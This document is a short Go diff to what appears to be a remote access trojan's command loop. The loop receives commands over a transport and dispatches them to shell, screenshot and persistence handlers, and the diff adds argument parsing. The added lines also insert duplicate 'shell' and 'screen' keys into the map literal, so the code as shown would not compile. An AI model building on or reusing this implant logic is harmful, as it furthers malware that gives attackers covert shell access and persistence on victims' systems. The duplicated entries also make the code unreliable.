@@ -6,9 +6,11 @@ import (
 	"strings"
 )
 
-type CommandHandler func(t transport.Transport)
+type CommandHandler func(t transport.Transport, args []string)
 
 var Registry = map[string]CommandHandler{
+	"shell":       ShellHandler,
+	"screen":      ScreenshotHandler,
 	"shell":       ShellHandler,
 	"screen":      ScreenshotHandler,
 	"persistence": PersistenceHandler,
@@ -23,9 +25,15 @@ func Handle(t transport.Transport) {
 		if err != nil {
 			return
 		}
-		command := strings.TrimSpace(string(input))
+		parts := strings.Fields(string(input))
+		if len(parts) == 0 {
+			continue
+		}
+		command := parts[0]
+		args := parts[1:]
+
 		if handler, ok := Registry[command]; ok {
-			handler(t)
+			handler(t, args)
 		} else {
 			t.Write([]byte("Comando no reconocido\n"))
 		}
